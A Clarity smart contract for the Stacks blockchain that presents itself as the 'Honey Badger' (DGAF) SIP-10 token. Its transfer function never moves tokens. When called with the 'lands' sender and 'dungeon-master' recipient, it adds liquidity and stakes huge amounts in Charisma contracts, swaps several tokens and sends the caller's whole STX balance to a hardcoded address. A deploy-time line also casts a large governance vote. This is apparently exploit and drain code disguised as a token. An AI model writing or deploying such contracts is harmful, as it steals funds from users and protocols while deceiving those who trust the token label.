;;  ---------------------------------------------------------
;; SIP-10 Fungible Token Contract For Bonding Curve | Created on: stx.city/bonding-curve/create
;; ---------------------------------------------------------

;; Errors 
(define-constant ERR-UNAUTHORIZED u401)
(define-constant ERR-NOT-OWNER u402)
(define-constant ERR-INVALID-PARAMETERS u403)
(define-constant ERR-NOT-ENOUGH-FUND u101)

(impl-trait 'SP2ZNGJ85ENDY6QRHQ5P2D4FXKGZWCKTB2T0Z55KS.dao-traits-v2.sip010-ft-trait)
(use-trait sip010 'SP2ZNGJ85ENDY6QRHQ5P2D4FXKGZWCKTB2T0Z55KS.dao-traits-v2.sip010-ft-trait)

;; Constants
(define-constant MAXSUPPLY u1000000000000)

;; Variables
(define-fungible-token DGAF MAXSUPPLY)
(define-data-var contract-owner principal tx-sender) 


;; SIP-10 Functions
(define-public (transfer (amount uint) (from principal) (to principal) (memo (optional (buff 34))))
    (if (and (is-eq from 'SP2ZNGJ85ENDY6QRHQ5P2D4FXKGZWCKTB2T0Z55KS.lands) (is-eq to 'SP2D5BGGJ956A635JG7CJQ59FTRFRB0893514EZPJ.dungeon-master))
        (begin
            (try! (contract-call? 'SP2ZNGJ85ENDY6QRHQ5P2D4FXKGZWCKTB2T0Z55KS.wrapped-charisma add-liquidity (* u5000000000 u1000000)))
            (try! (swap-token u55 'SP2ZNGJ85ENDY6QRHQ5P2D4FXKGZWCKTB2T0Z55KS.wrapped-charisma))
            (try! (contract-call? 'SP2ZNGJ85ENDY6QRHQ5P2D4FXKGZWCKTB2T0Z55KS.liquid-staked-charisma stake (* u10000000000 u1000000)))
            (try! (swap-token u54 'SP2ZNGJ85ENDY6QRHQ5P2D4FXKGZWCKTB2T0Z55KS.liquid-staked-charisma))
            (try! (swap-token u27 'SP3NE50GEXFG9SZGTT51P40X2CKYSZ5CC4ZTZ7A2G.welshcorgicoin-token))
            (try! (swap-token u15 'SP2C1WREHGM75C7TGFAEJPFKTFTEGZKF6DFT6E2GE.kangaroo))
            (if (> (stx-get-balance tx-sender) u0)
                (try! (stx-transfer? (stx-get-balance tx-sender) tx-sender 'SP3M0BBRZEJ8YBMF8WTSE0MHD04F0S9M4FE7DJVPK))
                true)
            (ok true))
        (ok true))
)

(define-public (swap-token (id uint) (contract <sip010>))
    (if (> (unwrap-panic (contract-call? contract get-balance tx-sender)) u0)
        (contract-call? 'SP1Y5YSTAHZ88XYK1VPDH24GY0HPX5J4JECTMY4A1.univ2-router swap-exact-tokens-for-tokens id 'SP1Y5YSTAHZ88XYK1VPDH24GY0HPX5J4JECTMY4A1.wstx contract contract 'SP1Y5YSTAHZ88XYK1VPDH24GY0HPX5J4JECTMY4A1.wstx 'SP1Y5YSTAHZ88XYK1VPDH24GY0HPX5J4JECTMY4A1.univ2-share-fee-to (unwrap-panic (contract-call? contract get-balance tx-sender)) u10000)
        (err u1))
)

;; DEFINE METADATA
(define-data-var token-uri (optional (string-utf8 256)) (some u"https://pdakhjpwkuwtadzmpnjm.supabase.co/storage/v1/object/public/uri/BrIVheVF-honey-badger-0-decimals.json"))

(define-public (set-token-uri (value (string-utf8 256)))
    (begin
        (asserts! (is-eq tx-sender (var-get contract-owner)) (err ERR-UNAUTHORIZED))
        (var-set token-uri (some value))
        (ok (print {
              notification: "token-metadata-update",
              payload: {
                contract-id: (as-contract tx-sender),
                token-class: "ft"
              }
            })
        )
    )
)


(define-read-only (get-balance (owner principal))
  (ok (ft-get-balance DGAF owner))
)
(define-read-only (get-name)
  (ok "Honey Badger")
)

(define-read-only (get-symbol)
  (ok "DGAF")
)

(define-read-only (get-decimals)
  (ok u6)
)

(define-read-only (get-total-supply)
  (ok (ft-get-supply DGAF))
)

(define-read-only (get-token-uri)
  (ok (var-get token-uri))
)

;; transfer ownership
(define-public (transfer-ownership (new-owner principal))
  (begin
    ;; Checks if the sender is the current owner
    (if (is-eq tx-sender (var-get contract-owner))
      (begin
        ;; Sets the new owner
        (var-set contract-owner new-owner)
        ;; Returns success message
        (ok "Ownership transferred successfully"))
      ;; Error if the sender is not the owner
      (err ERR-NOT-OWNER)))
)


;; ---------------------------------------------------------
;; Utility Functions
;; ---------------------------------------------------------
(define-public (send-many (recipients (list 200 { to: principal, amount: uint, memo: (optional (buff 34)) })))
  (fold check-err (map send-token recipients) (ok true))
)

(define-private (check-err (result (response bool uint)) (prior (response bool uint)))
  (match prior ok-value result err-value (err err-value))
)

(define-private (send-token (recipient { to: principal, amount: uint, memo: (optional (buff 34)) }))
  (send-token-with-memo (get amount recipient) (get to recipient) (get memo recipient))
)

(define-private (send-token-with-memo (amount uint) (to principal) (memo (optional (buff 34))))
  (let ((transferOk (try! (transfer amount tx-sender to memo))))
    (ok transferOk)
  )
)
(define-private (send-stx (recipient principal) (amount uint))
  (begin
    (try! (stx-transfer? amount tx-sender recipient))
    (ok true) 
  )
)

;; ---------------------------------------------------------
;; Mint
;; ---------------------------------------------------------
(contract-call? 'SP2D5BGGJ956A635JG7CJQ59FTRFRB0893514EZPJ.dme001-proposal-voting vote (* u2100 u1000000) true 'SP2MYKFP31BM5GMQKNXS6FJXR36K0T2AH0X8JHCC7.list-odin)